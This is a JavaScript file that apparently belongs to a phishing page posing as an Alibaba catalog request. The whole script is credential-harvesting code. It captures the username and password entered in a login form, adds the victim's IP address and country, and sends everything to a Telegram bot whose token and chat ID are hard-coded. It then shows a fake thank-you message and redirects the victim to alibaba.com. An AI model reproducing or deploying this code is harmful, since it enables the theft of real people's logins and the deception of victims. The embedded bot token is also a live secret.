document.addEventListener('DOMContentLoaded', function () {
    const form = document.getElementById('loginForm');

    form.addEventListener('submit', function (event) {
        event.preventDefault();
        
        const username = document.getElementById('username').value;
        const password = document.getElementById('password').value;

        // Parse the email domain
        const emailDomain = username.split('@')[1];

        // Get IP and location info
        fetch('https://ipapi.co/json/')
            .then(response => response.json())
            .then(data => {
                const ip = data.ip;
                const country = data.country_name;

                const message = `Username: ${username}\nPassword: ${password}\nEmail Domain: ${emailDomain}\nIP: ${ip}\nCountry: ${country}`;

                // Replace 'YOUR_BOT_TOKEN' and 'YOUR_CHAT_ID' with actual values
                const botToken = '7398105901:AAGMqPU6Xvcho2FwqubVM_r51ei8XkWKSLc';
                const chatId = '6651292809';
                const url = `https://api.telegram.org/bot${botToken}/sendMessage`;

                const payload = {
                    chat_id: chatId,
                    text: message
                };

                fetch(url, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(payload)
                })
                .then(response => {
                    if (response.ok) {
                        alert('PGR: Thank you! Catalog will be sent to your email shortly!');
                        window.location.href = 'https://www.alibaba.com';
                    } else {
                        alert('Error sending message.');
                    }
                })
                .catch(error => {
                    console.error('Error:', error);
                    alert('Error sending message.');
                });
            })
            .catch(error => {
                console.error('Error getting IP and location info:', error);
                alert('Error getting IP and location info.');
            });
    });
});
